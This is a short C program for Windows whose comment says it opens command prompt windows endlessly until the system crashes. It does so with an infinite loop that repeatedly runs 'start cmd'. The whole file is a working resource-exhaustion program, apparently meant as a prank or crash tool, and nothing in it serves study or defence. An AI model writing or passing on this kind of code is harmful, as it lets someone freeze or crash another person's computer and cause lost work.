// Opens an infinite number of command prompt window till the system crushes.
// Works on Windows OS only.

#include <stdlib.h>

main() {
  while(1) {  // Infinite loop
    system("start cmd");  // Execute the command to open a new Command Prompt window
  }
}
